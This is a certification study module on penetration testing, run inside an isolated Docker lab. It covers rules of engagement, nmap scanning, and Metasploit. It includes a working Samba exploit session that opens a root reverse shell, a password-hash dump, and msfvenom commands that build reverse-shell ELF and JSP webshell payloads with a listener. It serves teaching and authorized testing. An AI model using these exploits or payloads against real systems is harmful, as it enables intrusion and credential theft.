# Topic 335.2: Penetration Testing

> **LPIC-3 303 Security — Exam 303-300, version 3.0.0**
> Topic 335: Threats and Vulnerability Assessment · Objective 335.2 · Exam weight: **5**
>
> **Objective scope.** Understand the concept and phases of a penetration test; understand penetration testing frameworks and methodologies; master `nmap` scan techniques and options and use it to verify the effectiveness of network security measures; understand the Metasploit architecture and drive `msfconsole`; be aware of the OWASP Top 10 and of common penetration testing tools.

---

## 0. Legal and operational precondition — authorization is load-bearing

Every command in this module is a *tool*, and every tool here is run **only against systems you are contractually authorized to test**. Scanning, enumerating, or exploiting infrastructure you do not own or have written permission to assess is a criminal act under statutes such as the U.S. Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent legislation in most jurisdictions. A penetration test is distinguished from an attack by exactly one artifact: a signed **Rules of Engagement (RoE)** that defines scope, windows, and limits.

Treat the RoE as a machine-readable, version-controlled contract, not a PDF that lives in someone's inbox. Everything downstream — scan scope, rate limits, allowed exploit classes — derives from it.

```yaml
# roe.yaml — Rules of Engagement, committed alongside the engagement's tooling
engagement:
  id: PT-2026-0342
  client: acme-payments-prod
  type: gray-box            # black-box | gray-box | white-box
  authorized_by: "J. Ríos, CISO"          # named human with authority
  signed_at: "2026-08-20T09:00:00-03:00"
  contact_soc: "+54-11-5555-0100"          # who to call when a control trips
scope:
  in_scope_cidrs:
    - 203.0.113.0/28
    - 198.51.100.16/28
  in_scope_domains:
    - "*.staging.acme.example"
  out_of_scope:                            # explicit deny always wins
    - 203.0.113.1        # border router / management plane
    - "billing-db.internal.acme.example"   # PCI cardholder data store
constraints:
  test_window: "Mon-Thu 20:00-06:00 ART"   # off-peak only
  denial_of_service: forbidden             # no stress/flood/-T5 against prod
  social_engineering: forbidden
  data_exfiltration: "synthetic markers only, no real PII/PAN"
  max_scan_rate_pps: 500                    # ties directly to nmap --max-rate
  exploitation:
    allowed: true
    require_verbal_go: true                # phone SOC before any exploit module
    prohibited_modules: ["*/dos/*", "*wipe*", "*ransom*"]
deliverables:
  - executive_summary
  - technical_findings_cvss
  - remediation_guidance
  - raw_scan_artifacts        # .nmap/.gnmap/.xml, msf loot, screenshots
```

**Architectural framing for this module.** A penetration test is the *empirical validation* of everything the other 303-300 topics build defensively — the host hardening of 332.1, the MAC of 333.2, the packet filtering of 334.3, the VPN of 334.4. Hardening asserts a control *exists*; a pentest proves it *works against an adversary who is actively trying to defeat it*. `nmap` is the exam's chosen instrument precisely because it turns "we deployed a firewall" into a falsifiable measurement: which ports are `open`, which are `filtered`, and — critically — whether the two match the intended `iptables`/`nftables` policy.

---

## 1. The production problem: assumed controls vs. proven controls

Platform teams accumulate security controls the way they accumulate infrastructure — incrementally, under deadline, and rarely re-validated after the initial deploy. Consider a typical drift scenario in a Kubernetes-fronted service estate:

- A `NetworkPolicy` was written to isolate the payments namespace, but a later `kubectl apply` of a "debug" pod added a `NodePort` that punches a hole straight through to a backend on every node's external IP.
- An `nftables` ruleset on the bastion was hand-edited during an incident at 03:00; the temporary `accept` rule for port 6443 was never removed.
- A container image pinned `openssl 3.0.2` eighteen months ago; the base image's rebuild pipeline silently broke, so "we patch monthly" is now fiction.

None of these show up in a config review that reads the *intended* state (the Git-committed manifests). They show up only when something on the wire enumerates the *actual* exposed surface from the attacker's vantage point. That is the architectural role of penetration testing: **it measures the emergent, real attack surface, which is almost never identical to the declared one.**

### 1.1 Three distinct activities frequently conflated

| Activity | Question answered | Depth | Exploitation? | Typical cadence | Output |
|---|---|---|---|---|---|
| **Vulnerability assessment** | "What *known* weaknesses exist?" | Broad, shallow, automated | No — detection only | Continuous / weekly | Prioritized CVE list (CVSS) |
| **Penetration test** | "Can an attacker actually *chain* weaknesses to reach an objective?" | Narrow, deep, human-driven | Yes — proves impact | Quarterly / on release | Attack narrative + PoC + business risk |
| **Red team engagement** | "Would our *detection & response* catch a real adversary?" | Objective-based, stealthy | Yes — plus evasion of blue team | Annually | TTP timeline vs. SOC detections |

The exam objective 335.2 sits on the **penetration test** row. Vulnerability assessment (scanners) is a *phase within* it, and awareness of red-team framing (ATT&CK) is required, but the core competency is scoped scanning + verification + controlled exploitation.

### 1.2 The phases of a penetration test

The canonical lifecycle — align each phase to its dominant tool:

```
┌─────────────────┐   ┌──────────────┐   ┌───────────────┐   ┌──────────────┐
│ 1. Pre-engage-  │   │ 2. Recon /   │   │ 3. Scanning / │   │ 4. Exploit-  │
│    ment & RoE   │──▶│  Intelligence│──▶│  Enumeration  │──▶│    ation     │──┐
│ (scope, legal)  │   │ (OSINT, DNS) │   │ (nmap, NSE)   │   │ (msf, PoC)   │  │
└─────────────────┘   └──────────────┘   └───────────────┘   └──────────────┘  │
        ▲                                                                        │
        │             ┌──────────────┐   ┌───────────────┐   ┌──────────────┐  │
        └─────────────│ 7. Reporting │◀──│ 6. Post-      │◀──│ 5. Privilege │◀─┘
          feedback    │  & retest    │   │  exploitation │   │  escalation  │
                      └──────────────┘   │  (loot, pivot)│   │  & lateral   │
                                         └───────────────┘   └──────────────┘
```

- **Reconnaissance** is *passive* (OSINT, DNS, cert transparency, `theHarvester`, `amass`) — no packets to the target — versus **scanning**, which is *active* (packets on the wire, `nmap`). The passive/active distinction is a frequent exam trap.
- **Enumeration** extracts specifics: usernames, shares, software versions, endpoints — the raw material for matching exploits.
- **Exploitation** is the only phase gated behind a verbal go in a mature RoE, because it is the only phase that changes target state.
- **Post-exploitation** answers "so what?" — what data, what lateral reach, what persistence would a real attacker gain.
- **Reporting** is the deliverable the client pays for. A finding with no reproduction steps and no CVSS-anchored risk is worthless.

---

## 2. Methodologies and frameworks

Frameworks give the engagement structure, repeatability, and defensibility ("we followed NIST 800-115" is a legal and audit asset). The exam expects awareness of the major ones and their differences.

| Framework | Owner | Primary domain | Strength | Best used for |
|---|---|---|---|---|
| **PTES** (Penetration Testing Execution Standard) | Community | End-to-end pentest lifecycle | Defines the seven phases used industry-wide; pairs with a Technical Guidelines companion | Structuring a full commercial engagement |
| **NIST SP 800-115** | NIST (US gov) | Technical security testing & assessment | Authoritative, citable in compliance contexts (FedRAMP, FISMA) | Regulated/government environments |
| **OSSTMM** (Open Source Security Testing Methodology Manual) | ISECOM | Operational security measurement | Metrics-driven ("RAV" score); tests trust/controls quantitatively | Repeatable, measurable, audit-grade testing |
| **OWASP WSTG** (Web Security Testing Guide) | OWASP | Web application testing | Exhaustive per-vulnerability test cases (WSTG-*) | Application-layer engagements |
| **OWASP Top 10** | OWASP | Web risk *awareness* | Consensus of most critical web risks; not a methodology | Prioritization, developer education, reporting language |
| **MITRE ATT&CK** | MITRE | Adversary TTP knowledge base | Maps techniques to real threat actors; common tongue between red & blue | Red teaming, detection mapping, reporting TTPs |
| **Cyber Kill Chain** | Lockheed Martin | Intrusion phase model | Simple 7-stage narrative (recon→actions on objectives) | Executive-level attack storytelling |

**How they compose in practice:** you *scope and structure* with PTES or NIST 800-115, *execute web work* against WSTG test cases, *speak risk* in Top 10 / CVSS terms, and *describe adversary behavior* in ATT&CK technique IDs (e.g., `T1046 Network Service Discovery` is literally what `nmap` performs; `T1210 Exploitation of Remote Services` is what a Metasploit exploit module does). This mapping is what lets a blue team verify their detections against your report line by line.

---

## 3. Reproducible lab: the target range and attacker platform

You never learn `nmap` state semantics or Metasploit payload staging by reading — you learn them by watching packets against known-vulnerable targets in an **isolated** network. The following is a self-contained, disposable lab. It is deliberately built on an `internal` Docker network with **no default route to the host or the internet from the vulnerable targets**, so intentionally broken software can never be reached from outside.

```yaml
# docker-compose.yml — isolated pentest lab. NEVER expose these ports publicly.
name: pentest-lab

networks:
  range:
    driver: bridge
    internal: true          # <-- no NAT to the outside world for targets
    ipam:
      config:
        - subnet: 172.30.0.0/24

services:
  # ---------- Attacker workstation ----------
  attacker:
    image: kalilinux/kali-rolling:latest
    container_name: kali-attacker
    cap_add:
      - NET_RAW              # required for -sS/-sU raw-socket scans
      - NET_ADMIN
    networks:
      range:
        ipv4_address: 172.30.0.10
    command: >
      bash -c "apt-get update &&
               apt-get install -y nmap ncat metasploit-framework nikto
                                  hydra sqlmap gobuster whatweb dnsutils &&
               tail -f /dev/null"
    tty: true
    stdin_open: true

  # ---------- Vulnerable target: classic multi-service host ----------
  metasploitable:
    image: tleemcjr/metasploitable2:latest   # community image; SSH/FTP/SMB/HTTP/MySQL
    container_name: target-meta2
    networks:
      range:
        ipv4_address: 172.30.0.20

  # ---------- Vulnerable target: web app (DVWA) ----------
  dvwa:
    image: vulnerables/web-dvwa:latest
    container_name: target-dvwa
    networks:
      range:
        ipv4_address: 172.30.0.30

  # ---------- Vulnerable target: modern web app (OWASP Juice Shop) ----------
  juiceshop:
    image: bkimminich/juice-shop:latest
    container_name: target-juice
    environment:
      - NODE_ENV=unsafe
    networks:
      range:
        ipv4_address: 172.30.0.40
```

Bring it up and drop into the attacker:

```bash
$ docker compose up -d
[+] Running 5/5
 ✔ Network pentest-lab_range         Created                              0.1s
 ✔ Container kali-attacker           Started                              1.2s
 ✔ Container target-meta2            Started                              1.1s
 ✔ Container target-dvwa             Started                              1.0s
 ✔ Container target-juice            Started                              1.3s

$ docker exec -it kali-attacker bash
┌──(root㉿kali-attacker)-[/]
└─# ip -4 addr show eth0 | awk '/inet/{print $2}'
172.30.0.10/24
```

> **Isolation check.** From `attacker`, `ping 8.8.8.8` must fail for the *target* containers' subnet intent to hold; the attacker container itself is on the same `internal` network, so it too has no egress. If you need packages, install them at build time or attach a second, non-internal network to `attacker` only. Never attach the vulnerable containers to a routable network.

---

## 4. `nmap` — the core instrument of 335.2

`nmap` is the single most heavily weighted utility in this objective. You must understand *what packets each scan type sends, what response maps to what port state, and why a given state is reported.* Verifying "the effectiveness of network security measures" means reading these states against the intended firewall policy.

### 4.1 Host discovery (are hosts even up?)

```bash
# -sn = "no port scan" — host discovery only (the modern name for old -sP)
┌──(root㉿kali-attacker)-[/]
└─# nmap -sn 172.30.0.0/24
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 22:14 UTC
Nmap scan report for target-meta2 (172.30.0.20)
Host is up (0.000098s latency).
MAC Address: 02:42:AC:1E:00:14 (Unknown)
Nmap scan report for target-dvwa (172.30.0.30)
Host is up (0.000085s latency).
MAC Address: 02:42:AC:1E:00:1E (Unknown)
Nmap scan report for target-juice (172.30.0.40)
Host is up (0.00011s latency).
Nmap scan report for kali-attacker (172.30.0.10)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.19 seconds
```

Two host-discovery options matter for control verification because firewalls routinely drop the probes discovery relies on:

- **`-Pn`** — *skip host discovery entirely; treat every host as up.* Use this when a firewall drops ICMP and the default ping sweep wrongly concludes "host down," causing `nmap` to skip the port scan. This is the single most common false-negative cause in real engagements.
- **`-PS`/`-PA`/`-PU`/`-PE`** — TCP SYN / TCP ACK / UDP / ICMP-echo discovery probes; choose the one your target's firewall *doesn't* drop.

### 4.2 Scan types — packets sent and states inferred

| Flag | Name | Privilege | Packet sent | Response → state | Notes |
|---|---|---|---|---|---|
| `-sS` | TCP SYN ("half-open") | **root** (raw sockets) | `SYN` | `SYN/ACK`→open · `RST`→closed · none/ICMP-unreach→filtered | Default when root; fast, never completes handshake |
| `-sT` | TCP connect | any user | full 3-way via `connect()` | OS reports success→open · refused→closed · timeout→filtered | Used when no raw-socket privilege; noisy (logged by target apps) |
| `-sU` | UDP | **root** | empty UDP datagram (or protocol payload) | UDP reply→open · ICMP port-unreach→closed · none→`open|filtered` | Slow; ICMP rate-limiting cripples it |
| `-sA` | TCP ACK | **root** | `ACK` | `RST`→unfiltered · none/ICMP→filtered | Maps *firewall rules*, not open ports — tells you stateful vs. stateless |
| `-sN`/`-sF`/`-sX` | Null / FIN / Xmas | **root** | flags: none / FIN / FIN+PSH+URG | none→`open|filtered` · `RST`→closed | Exploits RFC 793; bypasses some stateless filters; useless vs. Windows |
| `-sW` | TCP Window | **root** | `ACK` (reads RST window size) | non-zero window→open | Rare; relies on old-stack quirks |
| `-sn` | (no port scan) | any | discovery probes only | — | Host discovery only |

**Reading these for control verification** is the whole point of the objective. The `-sA` (ACK) scan is the platform architect's favorite because it directly answers *"is my firewall stateful?"*: a stateless packet filter that only blocks inbound SYN will let an unsolicited ACK through and reply `RST` (reported `unfiltered`), whereas a stateful firewall drops the out-of-state ACK (reported `filtered`). That difference is invisible to a SYN scan.

### 4.3 Port states — the vocabulary of the measurement

| State | Meaning | What it tells you about the control |
|---|---|---|
| `open` | An application is actively accepting connections | Exposed surface — is it *supposed* to be? |
| `closed` | Host reachable, port replies `RST`, nothing listening | Host is up; no firewall dropping this port |
| `filtered` | No response / ICMP unreachable — a packet filter dropped it | **A firewall is doing its job here** (or a false negative) |
| `unfiltered` | Reachable but state undetermined (ACK scan only) | Firewall is stateless for this port |
| `open|filtered` | Can't tell open from filtered (no response — UDP/FIN/Null/Xmas) | Ambiguous; probe deeper with `-sV` |
| `closed|filtered` | Can't tell closed from filtered (Idle scan only) | Rare |

The distinction between `closed` and `filtered` **is** the effectiveness measurement: a hardened host should present `filtered` for everything except its intended service ports and `closed` for nothing externally. A wall of `closed` means the host is exposed with no packet filter in front of it.

### 4.4 A production-grade scan and its output

```bash
┌──(root㉿kali-attacker)-[/]
└─# nmap -sS -sV -O -p- --reason -T4 -oA scans/meta2_full 172.30.0.20
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 22:20 UTC
Nmap scan report for target-meta2 (172.30.0.20)
Host is up, received arp-response (0.000090s latency).
Not shown: 65505 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 64 vsftpd 2.3.4
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      syn-ack ttl 64 Linux telnetd
25/tcp   open  smtp        syn-ack ttl 64 Postfix smtpd
80/tcp   open  http        syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.0.20-Debian
3306/tcp open  mysql       syn-ack ttl 64 MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  syn-ack ttl 64 PostgreSQL DB 8.3.0 - 8.3.7
MAC Address: 02:42:AC:1E:00:14 (Unknown)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

Service Info: Host: metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 scanned) in 18.44 seconds
```

Flag-by-flag, and why each is here:

| Flag | Function | Production reasoning |
|---|---|---|
| `-sS` | SYN scan | Fast, half-open; default under root |
| `-sV` | Version detection | Turns "port 21 open" into "vsftpd 2.3.4" — the version is what you match against CVEs |
| `-O` | OS detection | TCP/IP stack fingerprint; drives exploit/OS selection |
| `-p-` | All 65535 TCP ports | Never trust the default top-1000; the interesting service is always on 8443/6443/9200 |
| `--reason` | Show *why* a state was assigned | The single most valuable diagnostic flag — see §9 |
| `-T4` | Timing template "aggressive" | Fast on a LAN/lab; **use `-T2` or `--max-rate` against prod** (RoE limit) |
| `-oA scans/meta2_full` | Output all 3 formats | `.nmap` (human), `.gnmap` (grep), `.xml` (import into Metasploit/reporting) |

`vsftpd 2.3.4` in that output is a textbook example of the measurement paying off: that exact version shipped with a backdoor (the `:)` smiley trigger). Version detection *is* the finding.

### 4.5 Timing and rate control (the RoE-critical dials)

| Template | Name | Behavior | When |
|---|---|---|---|
| `-T0` | paranoid | 5-min probe spacing, serial | IDS evasion, extreme stealth |
| `-T1` | sneaky | 15-sec spacing | Slow, low-noise |
| `-T2` | polite | Halves bandwidth, spaces probes | **Fragile prod systems** |
| `-T3` | normal | Default | General use |
| `-T4` | aggressive | Fast, assumes reliable network | LAN/lab, robust targets |
| `-T5` | insane | Sacrifices accuracy for speed | Only when you can tolerate false `filtered` |

For fine-grained control aligned to `max_scan_rate_pps` in the RoE:

```bash
# Cap outbound to 500 packets/sec to honour the RoE and avoid tripping rate-based IDS
└─# nmap -sS -p- --max-rate 500 --min-rate 100 --max-retries 2 \
        --host-timeout 30m -T2 203.0.113.0/28
```

> **Trap:** `-T5` and an over-aggressive `--min-rate` cause packets to be dropped in transit, which `nmap` reports as `filtered`. You then conclude "the firewall blocks it" when in reality *you* overran the link. Aggressive timing manufactures false positives about control effectiveness.

### 4.6 The Nmap Scripting Engine (NSE)

NSE (`--script`) is where `nmap` stops being a port scanner and becomes a vulnerability-detection and enumeration platform. Scripts are Lua, grouped into categories.

| Category | Purpose | Safe against prod? |
|---|---|---|
| `safe` | Won't crash/exploit the target | ✅ |
| `default` (`-sC`) | Runs at normal verbosity; broadly safe | ✅ |
| `discovery` | Enumerate more about the target | ✅ (mostly) |
| `version` | Aids `-sV` | ✅ |
| `auth` | Bypass/enumerate authentication | ⚠️ |
| `vuln` | Check for known vulnerabilities | ⚠️ probes real bugs |
| `brute` | Credential brute-forcing | ⚠️ noisy, may lock accounts |
| `intrusive` | May crash services or be logged | ⚠️ RoE-gated |
| `exploit` | Actively exploits | ⛔ treat as exploitation phase |
| `dos` | Denial of service | ⛔ RoE `forbidden` |

```bash
# SMB vulnerability sweep — 'vuln' category is intrusive: RoE go required
└─# nmap -p445 --script "smb-vuln-*" --script-args=unsafe=0 172.30.0.20
Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-25 22:31 UTC
Nmap scan report for target-meta2 (172.30.0.20)
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|_    Risk factor: HIGH
| smb-vuln-cve-2017-7494:
|   VULNERABLE:
|   SAMBA Remote Code Execution from Writable Share (CVE-2017-7494 / SambaCry)
|     State: VULNERABLE
|     Risk factor: HIGH  CVSSv3: 7.5
|_    References: https://www.samba.org/samba/security/CVE-2017-7494.html

Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds
```

Common enumeration scripts you should recognize: `http-title`, `http-enum`, `http-headers`, `ssl-cert`, `ssl-enum-ciphers` (validates the 334.4/331.x TLS posture!), `ssh2-enum-algos`, `smb-os-discovery`, `smb-enum-shares`, `dns-brute`, `banner`. Keep the local script DB current with `nmap --script-updatedb`.

### 4.7 `masscan` — when the surface is /16-scale

`nmap` is thorough but not the fastest asynchronous scanner. For internet-scale surface discovery, `masscan` transmits at line rate; you then feed its findings back into `nmap -sV` for accurate fingerprinting.

```bash
# masscan finds open ports fast (async, no handshake tracking)...
└─# masscan 203.0.113.0/24 -p1-65535 --rate 1000 -oL masscan.txt
# ...then nmap does deep inspection on ONLY the ports masscan found open
└─# nmap -sV -sC -p$(awk '/open/{print $3}' masscan.txt | paste -sd,) 203.0.113.5
```

---

## 5. Enumeration with `nmap` results + `ncat`

`ncat` (the Nmap-project rewrite of classic netcat, with TLS/proxy support) is the exam's named banner-grabbing and manual-interaction tool.

```bash
# Manual banner grab — confirm the service nmap fingerprinted
└─# ncat 172.30.0.20 21
220 (vsFTPd 2.3.4)
^C

# Test whether a port truly speaks HTTP (control verification, not just "open")
└─# printf 'HEAD / HTTP/1.0\r\n\r\n' | ncat 172.30.0.30 80
HTTP/1.1 302 Found
Date: Tue, 25 Aug 2026 22:40:11 GMT
Server: Apache/2.4.25 (Debian)
Location: login.php
X-Frame-Options: SAMEORIGIN

# ncat as a listener (the receiving end of a reverse shell — see §6.4)
└─# ncat -lvnp 4444
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:4444
```

`ncat` vs. legacy `nc`: `ncat` adds `--ssl`, `--proxy`, connection brokering (`--broker`), and access-control (`--allow`), and does **not** ship the `-e`/`--exec` "GAPING_SECURITY_HOLE" of traditional netcat by default — you must pass `-e`/`-c` explicitly. Know that distinction.

---

## 6. Metasploit Framework — architecture and `msfconsole`

Metasploit is the exam's named exploitation framework. You must understand its **architecture**, the module taxonomy, the payload model (staged vs. stageless, reverse vs. bind), and how to drive `msfconsole`.

### 6.1 Architecture

```
                          ┌────────────────────────────────────────┐
                          │        User interfaces                  │
                          │  msfconsole · msfvenom · RPC · msgrpc   │
                          └───────────────────┬────────────────────┘
                                              │
        ┌─────────────────────────────────────┴──────────────────────────┐
        │                 Metasploit Framework core (Ruby)                 │
        │   session mgr · module mgr · event subsystem · datastore        │
        └───────┬───────────────┬───────────────┬──────────────┬─────────┘
                │               │               │              │
        ┌───────▼──────┐ ┌──────▼──────┐ ┌──────▼─────┐ ┌──────▼───────┐
        │  PostgreSQL  │ │   REX lib   │ │  Modules   │ │  Plugins     │
        │ (workspaces, │ │ (sockets,   │ │ (see 6.2)  │ │ (nessus, etc)│
        │  hosts,creds,│ │  protocols) │ │            │ │              │
        │  loot, notes)│ └─────────────┘ └────────────┘ └──────────────┘
        └──────────────┘
```

The **PostgreSQL** backing store is what makes Metasploit an *engagement platform* rather than an exploit launcher: it persists hosts, services, credentials, and loot per **workspace**, and lets you import `nmap` XML directly (`db_import` / `db_nmap`).

### 6.2 Module taxonomy

| Module type | Purpose | Example |
|---|---|---|
| `exploit` | Code that triggers a vulnerability to deliver a payload | `exploit/multi/samba/usermap_script` |
| `payload` | Code run *on the target* after exploitation | `linux/x86/meterpreter/reverse_tcp` |
| `auxiliary` | Scanners, fuzzers, sniffers, DoS — no payload | `auxiliary/scanner/smb/smb_version` |
| `post` | Post-exploitation on an existing session | `post/linux/gather/hashdump` |
| `encoder` | Re-encode payloads (compatibility, *not* real AV bypass) | `x86/shikata_ga_nai` |
| `nop` | NOP sled generators | `x86/single_byte` |
| `evasion` | Purpose-built AV/EDR evasion | `windows/windows_defender_exe` |

### 6.3 Payload model — the concept most often misunderstood

**Staged vs. stageless** (read the delimiter in the name):

| | Staged (`/` separators) | Stageless (`_` separator) |
|---|---|---|
| Name pattern | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
| How it works | Small **stager** lands first, pulls the large **stage** (meterpreter) over the network | Entire payload delivered in one shot |
| Size on disk/wire | Tiny stager | Large single blob |
| Needs the handler up first | Yes — stage is fetched from the handler | Yes (for the connect-back) |
| Fragile over lossy links | Yes (stage transfer can fail) | More robust |
| Use when | Space-constrained exploit buffer | Dropping a standalone file, flaky network |

**Reverse vs. bind:**

| | Reverse (`reverse_tcp`) | Bind (`bind_tcp`) |
|---|---|---|
| Who initiates | **Target → attacker** (calls home) | **Attacker → target** (connects in) |
| Beats target ingress firewall/NAT | ✅ (egress is usually open) | ❌ (needs an open inbound port on target) |
| Beats attacker being behind NAT | ❌ (attacker must be reachable) | ✅ |
| Default choice | Reverse — egress filtering is rarer than ingress | Bind only when egress is fully locked down |

`LHOST`/`LPORT` (attacker's listener) apply to reverse payloads; `RHOST`/`RPORT` (target) apply to bind payloads and to the exploit's target selection.

### 6.4 A complete `msfconsole` engagement session

```bash
┌──(root㉿kali-attacker)-[/]
└─# msfdb init            # initialize the PostgreSQL backing store (once)
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf' / 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema

└─# msfconsole -q         # -q suppresses the banner
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

msf6 > workspace -a PT-2026-0342          # per-engagement isolation
[*] Added workspace: PT-2026-0342
[*] Workspace: PT-2026-0342

msf6 > db_nmap -sS -sV -p- 172.30.0.20    # scan AND persist to the DB
[*] Nmap: Starting Nmap 7.94 ( https://nmap.org )
[*] Nmap: 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
[*] Nmap: 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds

msf6 > hosts                               # what's now in the workspace
Hosts
=====
address       mac                name          os_name  os_flavor  purpose  info
-------       ---                ----          -------   ---------  -------  ----
172.30.0.20   02:42:ac:1e:00:14  target-meta2  Linux                server

msf6 > search samba usermap
Matching Modules
================
   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script      2007-05-14       excellent  No     Samba "username map script" Command Execution

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Rank: Excellent
  Platform: Unix
This module exploits a command execution vulnerability in Samba versions
3.0.20 through 3.0.25rc3 when using the non-default "username map script"
configuration option (CVE-2007-2447).

msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s)
   RPORT   139              yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port

msf6 exploit(multi/samba/usermap_script) > set RHOSTS 172.30.0.20
RHOSTS => 172.30.0.20
msf6 exploit(multi/samba/usermap_script) > set LHOST 172.30.0.10
LHOST => 172.30.0.10
msf6 exploit(multi/samba/usermap_script) > check
[*] 172.30.0.20:139 - This module does not support check.

msf6 exploit(multi/samba/usermap_script) > exploit
[*] Started reverse TCP handler on 172.30.0.10:4444
[*] Command shell session 1 opened (172.30.0.10:4444 -> 172.30.0.20:38091)

id
uid=0(root) gid=0(root)
hostname
metasploitable
```

Key `msfconsole` verbs to know cold: `search`, `use`, `info`, `show options`, `show payloads`, `set`/`setg` (global), `unset`, `check` (non-destructive verification), `exploit`/`run`, `background`, `sessions -l`, `sessions -i <id>`.

### 6.5 A meterpreter session and post-exploitation

```bash
msf6 exploit(...) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer     : 172.30.0.20
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
Meterpreter  : x86/linux

meterpreter > getuid
Server username: root

meterpreter > ps               # process list (for migration targets)
meterpreter > background       # keep session, return to msf prompt
[*] Backgrounding session 1...

msf6 > use post/linux/gather/hashdump
msf6 post(linux/gather/hashdump) > set SESSION 1
msf6 post(linux/gather/hashdump) > run
[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/..._linux.hashes_734921.txt
```

### 6.6 `msfvenom` — standalone payload generation

`msfvenom` (the merged `msfpayload` + `msfencode`) builds payloads outside an exploit — for phishing docs, uploaded webshells, or manual delivery.

```bash
# Linux ELF reverse-meterpreter, staged
└─# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.30.0.10 LPORT=4444 \
             -f elf -o /tmp/payload.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: /tmp/payload.elf

# A JSP webshell for a vulnerable file-upload (Java app servers)
└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.30.0.10 LPORT=4444 -f raw -o shell.jsp
```

You then catch any reverse payload with the generic handler:

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.30.0.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 172.30.0.10:4444
```

> **Encoders are not AV bypass.** `-e x86/shikata_ga_nai` re-encodes a payload for byte-level compatibility (avoiding bad chars like null bytes), *not* to evade modern EDR — signature-based AV catches the decoder stub. Real evasion is the `evasion` module class and is heavily RoE-gated. The exam expects you to know an encoder's *actual* purpose.

---

## 7. Web application testing — OWASP Top 10 and scanners

The objective requires *awareness* of the OWASP Top 10 and of web application scanning — not exhaustive exploitation, but you must recognize the risk categories and the named tools.

### 7.1 OWASP Top 10 (2021)

| ID | Category | Representative issue | Fast detection |
|---|---|---|---|
| A01 | Broken Access Control | IDOR, missing authz, path traversal | Burp/ZAP authz testing |
| A02 | Cryptographic Failures | Plaintext transport, weak TLS, bad key mgmt | `nmap --script ssl-enum-ciphers`, `testssl.sh` |
| A03 | Injection | SQLi, command injection, LDAPi | `sqlmap`, ZAP active scan |
| A04 | Insecure Design | Missing threat model, flawed workflow | Manual review |
| A05 | Security Misconfiguration | Default creds, verbose errors, open admin | Nikto, `nuclei` |
| A06 | Vulnerable & Outdated Components | Unpatched libs/frameworks | `nmap -sV`, `nuclei`, dependency scan |
| A07 | Identification & Auth Failures | Weak passwords, no MFA, session fixation | `hydra`, session analysis |
| A08 | Software & Data Integrity Failures | Insecure deserialization, unsigned updates | Manual, `nuclei` |
| A09 | Logging & Monitoring Failures | No audit trail, no alerting | Detection review (blue-team) |
| A10 | Server-Side Request Forgery (SSRF) | Server fetches attacker URL | Manual, out-of-band (OAST) |

### 7.2 The named web scanners

```bash
# Nikto — fast, noisy web server misconfiguration/known-file scanner (A05/A06)
└─# nikto -h http://172.30.0.30
- Nikto v2.5.0
+ Target IP:          172.30.0.30
+ Server: Apache/2.4.25 (Debian)
+ /: The X-Content-Type-Options header is not set.
+ /config/: Directory indexing found.
+ /login.php: Admin login page/section found.
+ Apache/2.4.25 appears to be outdated (current is at least 2.4.54).
+ OSVDB-3268: /docs/: Directory indexing found.
